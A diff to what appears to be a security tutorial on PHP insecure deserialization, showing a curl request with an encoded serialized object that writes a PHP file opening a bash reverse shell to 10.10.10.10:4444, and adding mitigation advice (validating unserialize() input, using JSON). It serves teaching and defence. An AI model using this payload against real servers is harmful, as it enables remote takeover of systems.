@@ -251,4 +251,9 @@ Now we can pass the encoded string into the ```user_input``` variable as follows
 kali@kali:~$ curl -i http://example.com/server.php?user_input=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A9%3A%22revsh.php%22%3Bs%3A4%3A%22data%22%3Bs%3A73%3A%22%3C%3Fphpexec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.10.10%2F4444+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
 ```
 
-This will write the file to the root of the server. The file that's copied (revsh.php) can now be executed simply by navigating to http://example.com/revsh.php and the reverse shell can be caught with a listener.
+This will write the file to the root of the server. The file that's copied (revsh.php) can now be executed simply by navigating to ```http://example.com/revsh.php``` and the reverse shell can be caught with a listener.
+
+## Avoiding deserialization vulnerabilities
+
+1. Input validation: Review the use of the ```unserialize()``` function and ensure that external parameters are handled safely
+2. Using standard formats: Use standard data exchange formats such as JSON (via ```json_decode()``` and ```json_encode()```) if you need to pass serialized data to the user.
